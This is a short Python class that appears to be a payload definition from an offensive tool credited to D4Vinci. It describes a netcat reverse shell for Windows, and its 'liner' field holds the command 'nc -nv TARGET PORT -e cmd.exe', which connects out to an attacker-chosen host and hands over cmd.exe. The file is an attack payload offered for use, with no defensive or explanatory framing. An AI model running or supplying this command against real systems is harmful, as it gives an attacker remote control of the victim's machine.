class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses netcat tool to establish a reverse shell"
    function    = "reverse shell"
    liner       = """nc -nv TARGET PORT -e cmd.exe"""
